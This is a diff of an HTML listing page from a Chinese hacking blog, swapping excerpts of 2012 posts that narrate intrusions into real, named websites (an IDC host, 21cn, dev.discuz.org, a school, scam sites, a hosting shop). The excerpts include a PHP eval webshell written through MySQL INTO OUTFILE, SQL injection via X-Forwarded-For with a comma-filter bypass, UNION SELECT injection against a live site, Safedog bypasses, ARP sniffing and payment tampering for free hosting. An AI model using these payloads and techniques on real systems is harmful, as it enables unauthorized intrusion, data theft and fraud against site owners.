@@ -45,29 +45,22 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-08-09T18:13:46.000Z" itemprop="datePublished">
-          2012-08-10
+      <time datetime="2012-11-03T05:41:55.000Z" itemprop="datePublished">
+          2012-11-03
       </time>
     
-    
-    | 
-    <a href='/tag/入侵/'>入侵</a>,
-    
-    <a href='/tag/idc/'>idc</a>
-    
-    
 </span>
-      <h2 class="post-title"><a href="/747.seo/">对IDC的一次检测</a></h2>
+      <h2 class="post-title"><a href="/925.seo/">51cto主站及旗下所有子站沦陷</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>群里兄弟抛来一个站点，说要弄C段的另一个站点。看看，该IDC站点有数据备份后台，弱口令进入。   <br /><a href="http://img.cker.in/IDC_8FAD/clip_image002.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/IDC_8FAD/clip_image002_thumb.jpg" width="620" height="452" /></a>    <br />一、拿个shell    <br />php站点，mysql数据库，可以sql备份、导入、导出、执行SQL，没有上传，root权限。    <br />但是找不到站点的绝对路径，群里兄弟就找找周围的站点，希望能得到某个站点的绝对路径，    <br />不久就爆出一个php的站点，准备mysql导出shell，但网站有注入检测系统，导入不成功，原因有：    <br />（1）路径不对；    <br />（2）root被降权，没有权限写；    <br />（3）被检测到恶意代码；    <br />前几天碰到过这种情况，改了</p>  <p>1. Select ‘&lt;?php @eval($_POST[cmd])?&gt;; ‘ into/**/outfile……../b.php’，OK</p>  <p>复制代码</p>  <p>连接成功。得到一个旁站的php shell。   <br />测试了结果：    <br />(1)执行命令不行；    <br />(2)只能在本站转；    <br />什么也干不了。    <br />二、再拿php、asp&#160; shell    <br />后来有人把mysql的root密码破了，登陆phpmyadmin，直接进行数据库操作。用mysql客户端登陆没有登陆上。    <br />上php大马，udf提权也失败了，原因不明。旁站的php shell权限很小，想到能利用的真不多。    <br />又有人得到一个asp旁站的shell，上去看了，除了数据库组件、fso、mai组件外，其他都不能用，难怪不能执行cmd。    <br />陆续又得到几个旁站的shell，都市php和asp的，能利用的少。</p>
+        1个小漏洞导致  1.旗下linkphone.cn, phpcms V9 读取任意文件漏洞爆数据库配置信息   2.数据库程序处于分离状态，果断扫相邻ip段3306，非常不幸的是数据库在该段里，并且还开了外链，本地phpmyadmin连上    3.结果数据只能读不能写，关键是所有站点的数据库都在这台服务器上   #1290 - The MySQL server is running with the –read-only option
       
       </p>
       
       <p>
-          <a href="/747.seo/" class="excerpt-link">Read More...</a>
+          <a href="/925.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -76,27 +69,31 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-08-08T11:57:47.000Z" itemprop="datePublished">
-          2012-08-08
+      <time datetime="2012-11-02T23:24:07.000Z" itemprop="datePublished">
+          2012-11-03
       </time>
     
     
     | 
-    <a href='/tag/渗透/'>渗透</a>
+    <a href='/tag/Discuz/'>Discuz</a>,
+    
+    <a href='/tag/渗透检测/'>渗透检测</a>,
+    
+    <a href='/tag/X-Forwarded-For/'>X-Forwarded-For</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/739.seo/">对21cn分站的检测</a></h2>
+      <h2 class="post-title"><a href="/924.seo/">记一次对Discuz官方论坛的渗透检测</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>原文地址：法克论坛   <br />作者：泪少    <br />网址：<a href="http://zhao.21cn.com（漏洞站点的域名/URL）">http://zhao.21cn.com（漏洞站点的域名/URL）</a></p>  <p>站点：天翼关爱 电信旗下21分站 （漏洞站点的名字，记得是全称）</p>  <p>风险一   <br />风险描述：后台列目录 可以下载源文件 从文件找到mysql的密码 找到mysql库里查询后台登录地址 进一步<a href="http://ha.cker.in/tag/渗透" target="_blank">渗透</a> （这里你发现的是什么漏洞就写什么漏洞）    <br />风险示例：    <br /><a href="http://img.cker.in/21cn_3785/clip_image001.png" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/21cn_3785/clip_image001_thumb.png" width="497" height="395" /></a></p>
+        <p>前言: 此次检测纯属偶然, 源于Errorera同学一直想拿下腾讯, 然后找腾讯换ipad玩, 结果搞着搞着就把目标对准Discuz了, 反正<a href="http://ha.cker.in/tag/Discuz" target="_blank">Discuz</a>也属于腾讯业务,    <br />估计搞下也能换ipad, Errorera同学怀着这样的美好愿望就开搞了!    <br />此文所有图片均由Errorera同学提供, 本来我想等我把文章写了他再提交的, 可丫太着急要ipad了, 所以瞒着我直接提交了!! 所以现在所有漏洞都已经修补,&#160; <br />导致我想截图都截不了了… 还好他已经写了一篇文章, 我就将就直接修改下拿上来吧~    <br />过程Top1: Dev.<a href="http://ha.cker.in/tag/Discuz" target="_blank">Discuz</a>.Org注射: (此过程前几日已在土司发了部分内容, 之后自己删除, 原因后面会提到)    <br />下午我正在卖衣服, 突然Errorera就在群里说找到突破口了, 原来Dev.Discuz.Org这个站是Discuz的开发者论坛, 但是却很二逼的直接把”<a href="http://ha.cker.in/tag/X-Forwarded-For" target="_blank">X-Forwarded-For</a>”直接带入了数据库, 且无任何过滤, so..注射就这样产生了~ 首先直接打开是显示登录页面:    <br /><a href="http://img.cker.in/Discuz_D755/clip_image002.png" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/Discuz_D755/clip_image002_thumb.png" width="620" height="385" /></a>    <br />然后再修改下X-Forwarded-For的值为111′, 再刷新下页面Mysql就报错了:    <br /><a href="http://img.cker.in/Discuz_D755/clip_image004.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/Discuz_D755/clip_image004_thumb.jpg" width="620" height="140" /></a>    <br />既然存在注射, 那首先想的肯定是怎么获取到我们想要的信息了, 用户数据库? 亦或是ROOT密码? 还是直接into_Outfile呢 = =? 不过这都是废话, 要是这么简单搞定的话也就没后话了~    <br />首先看这Mysql信息肯定是使用的DISCUZ来构建的, 但是具体是什么版本就不知道了, 所以我就先猜了下字段数, 想用常规方法爆出东西, 最后确定字段数为5, 然后就顺手union了, 殊不知过滤了逗号, 顿时傻逼…..    <br />以上图没截到, 所以就一笔带过吧~ 随后多次测试, 使用了网上提到的JOIN方法成功突破:</p>  <p>127’ UNION SELECT <em> FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)#</p>  <p>UNION SELECT </em> FROM ((SELECT 1)a JOIN (SELECT 2)b实际上也就相当于UNION SELECT 1,2   <br />正当我以为会出现熟悉的1 2 3 4 5的时候, 却直接登录进去了….    <br /><a href="http://img.cker.in/Discuz_D755/clip_image006.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006" border="0" alt="clip_image006" src="http://img.cker.in/Discuz_D755/clip_image006_thumb.jpg" width="620" height="222" /></a>    <br />这dz是什么版本也不知道, 更不知道他的具体写法, 目测的话应该是在判断登录与未登录的时候出现的问题, 可能在判断的时候用到了mysql查询, 然后把登陆成功用户状态的登录状态写入数据库, 当然以上只是猜想, 具体是咋回事暂且不清楚o(∩_∩)o~ 不过这里只是看上去登录进去了, 提示不欢迎我 = =.. 于是我又刷新了下, 就立马笑了<del></p><br>
       
       </p>
       
       <p>
-          <a href="/739.seo/" class="excerpt-link">Read More...</a>
+          <a href="/924.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -105,33 +102,27 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-07-08T07:13:39.000Z" itemprop="datePublished">
-          2012-07-08
+      <time datetime="2012-11-02T21:47:12.000Z" itemprop="datePublished">
+          2012-11-03
       </time>
     
     
     | 
-    <a href='/tag/fckeditor/'>fckeditor</a>,
-    
-    <a href='/tag/C段/'>C段</a>,
-    
-    <a href='/tag/上传漏洞/'>上传漏洞</a>,
-    
-    <a href='/tag/弱口令/'>弱口令</a>
+    <a href='/tag/白富美/'>白富美</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/659.seo/">hei快拍官网的过程</a></h2>
+      <h2 class="post-title"><a href="/923.seo/">00后白富美学校-某黑阔渗透过程</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p><p>记录下，不应说黑，应说是改快拍二维码官网首页。</p>  <p>闲着无聊，老师出差中。。。无心学习，果断玩下渗透</p>  <p>看准了目标，就来快拍吧 域名：<a href="http://www.kuaipai.cn/">www.kuaipai.cn</a></p>  <p><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/hei_E03/clip_image001.jpg" width="767" height="771" /></p>  <p>简单查看了下，整站是php的，没打算从主站入手，直接<a href="http://ha.cker.in/tag/C段" target="_blank">c段</a>算了，嘿嘿，其实卖关子了，现在正式开始</p>  <p>直接IIS PUT 跑121.101.22x.1- 121.101.22x.254 这个网段的ip，经过测试，发现一个疑似有<a href="http://ha.cker.in/tag/弱口令" target="_blank">弱口令</a>的登陆点</p>  <p></p>
+        <p>起因很简单咋QQ邮箱的订阅里收到了此消息</p>  <p><a href="http://img.cker.in/00_BFAC/clip_image002.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/00_BFAC/clip_image002_thumb.jpg" width="574" height="147" /></a></p>  <p>00后<a href="http://ha.cker.in/tag/白富美" target="_blank">白富美</a>啊<code>让咱这90后没有对象的屌丝情何以堪</code></p>  <p>打开后看到了她们学校</p>  <p><a href="http://img.cker.in/00_BFAC/clip_image004.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/00_BFAC/clip_image004_thumb.jpg" width="349" height="482" /></a></p>  <p>XX实验学校…（我们是本着学习的态度，全程打码。）</p>  <p>百度之``</p>  <p>网站是www.<strong><strong>.cn</p>  <p><a href="http://img.cker.in/00_BFAC/clip_image006.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006" border="0" alt="clip_image006" src="http://img.cker.in/00_BFAC/clip_image006_thumb.jpg" width="426" height="98" /></a></p><br>
       
       </p>
       
       <p>
-          <a href="/659.seo/" class="excerpt-link">Read More...</a>
+          <a href="/923.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -140,29 +131,27 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-07-08T07:06:36.000Z" itemprop="datePublished">
-          2012-07-08
+      <time datetime="2012-11-01T03:28:08.000Z" itemprop="datePublished">
+          2012-11-01
       </time>
     
     
     | 
-    <a href='/tag/渗透/'>渗透</a>,
-    
-    <a href='/tag/钓鱼/'>钓鱼</a>
+    <a href='/tag/突破安全狗/'>突破安全狗</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/656.seo/">对某钓鱼网站的一次渗透</a></h2>
+      <h2 class="post-title"><a href="/919.seo/">日一骗子站，最新大小马突破安全狗并提权</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>某天在淘宝上买了点东西，和店主确认几句之后，他发来一个链接，让我去支付。    <br />七转八转来到这个页面:     <br /><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/8f598be352ba_B732/clip_image001.jpg" width="516" height="345" />     <br />我看了一下这个网址不对劲，是<a href="http://item.taobao.com-xxxx.co.tv/pay/，莫非我遇上了传说中的淘宝钓鱼？于是立马来了精神，那就顺势检测一下这个钓鱼网站吧。">http://item.taobao.com-xxxx.co.tv/pay/，莫非我遇上了传说中的淘宝钓鱼？于是立马来了精神，那就顺势检测一下这个钓鱼网站吧。</a>     <br />先试试手气，在网址后面加个login.asp，居然看到了后台登录页面！     <br /><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/8f598be352ba_B732/clip_image002.jpg" width="444" height="321" />     <br />试了几个弱口令和万能密码都无果。但是我发现，当用户名输入”admin”，密码为”123”的时候，提示”你输入的密码有误！”；而用户名输入”123”,密码为”123”时，则提示“你输入的用户名有误！”。</p>
+        作者：老树  起因：  有一朋友在网上购买了一台手机，等了十多天也没有收到货，才发现被骗了，于是有了下文。  过程：  头晕晕的，文笔不好，因为服务器关了，图就没了，大家将就着看，不喜欢的勿扰。谢谢！  用wvs扫了一下目录，发现了是ewebeditor，用默认密码admin888进入了后台，拿shell就不说了，样式添加asa拿到了shell，这个简单就不说了。  用菜刀连接不了，上传大马也不行。。。  换了一个过安全狗的一句话，&l
       
       </p>
       
       <p>
-          <a href="/656.seo/" class="excerpt-link">Read More...</a>
+          <a href="/919.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -171,41 +160,29 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-07-03T20:20:57.000Z" itemprop="datePublished">
-          2012-07-04
+      <time datetime="2012-10-28T20:46:06.000Z" itemprop="datePublished">
+          2012-10-29
       </time>
     
     
     | 
-    <a href='/tag/社工/'>社工</a>,
+    <a href='/tag/Webshell/'>Webshell</a>,
     
-    <a href='/tag/入侵/'>入侵</a>,
-    
-    <a href='/tag/黑客/'>黑客</a>,
-    
-    <a href='/tag/免杀/'>免杀</a>,
-    
-    <a href='/tag/九区大黑阔/'>九区大黑阔</a>,
-    
-    <a href='/tag/抓鸡/'>抓鸡</a>,
-    
-    <a href='/tag/嗅探/'>嗅探</a>,
-    
-    <a href='/tag/C段/'>C段</a>
+    <a href='/tag/突破安全狗/'>突破安全狗</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/647.seo/">嗅探+社工拿下独特365服务器</a></h2>
+      <h2 class="post-title"><a href="/913.seo/">MACCMS PHP版突破安全狗后台拿webshell</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>DiS9 TeAm    <br /><a href="http://ha.cker.in/tag/九区大黑阔" target="_blank">大黑阔</a>站啊 网站注册    <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/365_ACDA/clip_image002.jpg" width="558" height="280" />    <br />尼玛各种帖子加起来 几千万 上亿都可能。    <br /><a href="http://ha.cker.in/tag/免杀" target="_blank">免杀</a>无敌 <a href="http://ha.cker.in/tag/抓鸡" target="_blank">抓鸡</a>无敌    <br />主站 dz2.5x 原来看见一个getshell&#160; 不能发表日志，后来用管理员账号登陆 日志发了 getshell 射不到</p>  <p>主站一个 没利用价值   <br />果断C 迅速拿下两个,发现是vps 蛋疼。    <br /><a href="http://ha.cker.in/tag/C段" target="_blank">C段</a>两个都是独站    <br />一个卖东西的 只是一个简单的html站点 其他链接全是淘宝 目录下打包了一个文件 下载后 发现是serv-u 以为是站长从网上下的放在这 后来破解密码 FTP直接连了。。。。。    <br />还有一个是DEDE5.7 0day没补 root权限 UDF 提权    <br />上服务器arp -a 发现与目标一个段 下载CAIN 对方服务器<a href="http://ha.cker.in/tag/嗅探" target="_blank">嗅探</a>10分钟后 就挂了。。。但是就是这10分钟 你说我运气怎么又这么好。。</p>
+        <p>昨天碰上的，记录一下过程，没什么含量，类似的文章肯定有，如有雷同肯定巧合（语文不太好，大家将就着看）：   <br />条件：    <br />1、电影站是maccms php版本的。    <br />2、服务器安装了<a href="http://ha.cker.in/tag/突破安全狗" target="_blank">安全狗</a>。    <br />3、有后台帐号密码。    <br />当然了首先第一步百度一下，有没有相关文章。发现了先前有大牛发了一个上传的漏洞测试失败，估计是官方已修复。    <br />进后台，发现可以编辑模板，如下图：    <br /><a href="http://img.cker.in/MACCMSPHPwebshell_B328/clip_image001.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/MACCMSPHPwebshell_B328/clip_image001_thumb.jpg" width="967" height="655" /></a>    <br />路径是：    <br /><a href="http://0855.tv/admin/admin_templates.php?action=edit&amp;file=../template/default/html/art.html">http://0855.tv/admin/admin_templates.php?action=edit&amp;file=../template/default/html/art.html</a>    <br />然后IE里构造一下：    <br /><a href="http://0855.tv/admin/admin_templates.php?action=edit&amp;file=index.php">http://0855.tv/admin/admin_templates.php?action=edit&amp;file=index.php</a>    <br />得到：    <br /><a href="http://img.cker.in/MACCMSPHPwebshell_B328/clip_image002.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/MACCMSPHPwebshell_B328/clip_image002_thumb.jpg" width="743" height="590" /></a>    <br />这个可比那个 ShopEx后台历遍目录 猛多了，不但可以看到内容，还可以编辑。    <br />这样的话，基本上就可以拿<a href="http://ha.cker.in/tag/webshell" target="_blank">webshell</a>了。含量不高。为了不破坏程序，我打算在admin/version.php    <br />这个文件中写入后门。</p><br>
       
       </p>
       
       <p>
-          <a href="/647.seo/" class="excerpt-link">Read More...</a>
+          <a href="/913.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -214,27 +191,31 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-06-28T07:48:16.000Z" itemprop="datePublished">
-          2012-06-28
+      <time datetime="2012-10-28T20:34:02.000Z" itemprop="datePublished">
+          2012-10-29
       </time>
     
     
     | 
-    <a href='/tag/渗透/'>渗透</a>
+    <a href='/tag/burpsuite/'>burpsuite</a>,
+    
+    <a href='/tag/idc/'>idc</a>,
+    
+    <a href='/tag/支付漏洞/'>支付漏洞</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/611.seo/">记新手的一次渗透入侵</a></h2>
+      <h2 class="post-title"><a href="/912.seo/">burpsuite之免费购买虚拟空间之沦陷IDC服务商</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p><table border="0" cellspacing="0" cellpadding="0"><tbody>     <tr>       <td>         <p>一年前把，<a href="http://ha.cker.in/tag/渗透" target="_blank">渗透</a><b></b>了，这次发现不是root，但帐户支持load_file()            <br />Ps：我严重鄙视挂马的人，还有那些黑心贩子。。。            <br />Ps：我从一开始写文章到现在，不屏蔽<b>渗透</b>的地址连接，主要的原因还是希望            <br />大家可以通过我的文章，真正实践性滴学习本文内容，新人朋友可以一步步滴实践操作            <br />【懒得扯淡了，希望大家那个什么什么什么，你们懂的，人品很重要】            <br /><a href="http://www.czxtaiji.net/content.php?theMenuId=4&amp;theSubMenuId=1&amp;theArticleId=48%20and%201=2">http://www.czxtaiji.net/content. … leId=48%20and%201=2</a>            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 947            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 948            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 949            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 950            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 951            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 952            <br />Warning: mysql_result(): Unable to jump to row 0 on MySQL result index 12 in d:\czxsite\bin\sys\config.php on line 953            <br />获取到路径：d:\czxsite\bin\sys\config.php            <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/0a82505b9f50_14E77/clip_image002.jpg" width="604" height="316" />            <br /><a href="http://www.czxtaiji.net/content.php">http://www.czxtaiji.net/content.php</a>            <br />?theMenuId=4            <br />&amp;theSubMenuId=1            <br />&amp;theArticleId=48 order by 9            <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/0a82505b9f50_14E77/clip_image004.jpg" width="604" height="240" />            <br /><a href="http://www.czxtaiji.net/content.php">http://www.czxtaiji.net/content.php</a>            <br />?theMenuId=4            <br />&amp;theSubMenuId=1            <br />&amp;theArticleId=-48 union select 1,2,3,4,5,6,7,8,9            <br />Warning: disparticlecontent(7): failed to open stream: No such file or directory in d:\czxsite\bin\sys\config.php on line 976            <br />Warning: disparticlecontent(): Failed opening ‘7’ for inclusion (include_path=’.;c:\php4\pear’) in d:\czxsite\bin\sys\config.php on line 976            <br /><a href="http://www.czxtaiji.net/content.php">http://www.czxtaiji.net/content.php</a>            <br />?theMenuId=4            <br />&amp;theSubMenuId=1            <br />&amp;theArticleId=-48 union select 1,2,3,4,user(),database(),7,8,version()            <br />user():czxtaiji@localhost            <br />version():4.0.18-nt&#160;&#160; <br />database():czxtaiji            <br /><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006" border="0" alt="clip_image006" src="http://img.cker.in/0a82505b9f50_14E77/clip_image006.jpg" width="604" height="237" /></p>       </td>     </tr>   </tbody></table>
+        <p>by:245661320@90sec.org</p>  <p>本人文笔不好，其实这次渗透过程也很艰难曲折的，只是个人文笔问题表达的不太生动，大家见谅！！</p>  <p>今天给大家讲解下burpsuite应用，这个东西我在咱们这里看用着比较少，今天我就来给大家来讲解下。</p>  <p>前两天我在淘宝上找了个空间，但我又不想花钱，怎么办呢？结果有了下文。</p>  <p><a href="http://img.cker.in/burpsuiteIDC_B045/clip_image002.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/burpsuiteIDC_B045/clip_image002_thumb.jpg" width="620" height="357" /></a></p>  <p>于是我就在他那个网站注册了个会员，然后左看看右看看做一些测试比较繁琐我就不一一讲述了。</p>  <p>然后我点金那个详细，看见有购买空间，我就用burpsuite截取下他的数据包看看可不可以改包进行突破！</p>  <p><a href="http://img.cker.in/burpsuiteIDC_B045/clip_image003.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003" border="0" alt="clip_image003" src="http://img.cker.in/burpsuiteIDC_B045/clip_image003_thumb.jpg" width="349" height="127" /></a></p>  <p><a href="http://img.cker.in/burpsuiteIDC_B045/clip_image004.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/burpsuiteIDC_B045/clip_image004_thumb.jpg" width="242" height="200" /></a></p>  <p>先声明，我这个号里没有钱一分钱也没有</p>  <p><a href="http://img.cker.in/burpsuiteIDC_B045/clip_image005.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image005" border="0" alt="clip_image005" src="http://img.cker.in/burpsuiteIDC_B045/clip_image005_thumb.jpg" width="400" height="63" /></a></p>  <p>后我就开始截取封包，该数据，把购买几年那里改为-1我们在发送数据包也就是我们125元买-1年的空间但是他要是没有做错误处理的话肯定会出</p><br>
       
       </p>
       
       <p>
-          <a href="/611.seo/" class="excerpt-link">Read More...</a>
+          <a href="/912.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -242,7 +223,7 @@
   
   <nav class="pagination" role="pagination">
     <a class="newer-posts" href="/category/渗透测试/page/5/">← Newer Posts</a>
-    <span class="page-number">Page 6 of 11</span>
+    <span class="page-number">Page 6 of 16</span>
     <a class="older-posts" href="/category/渗透测试/page/7/">Older Posts →</a>
   </nav>
 </main>
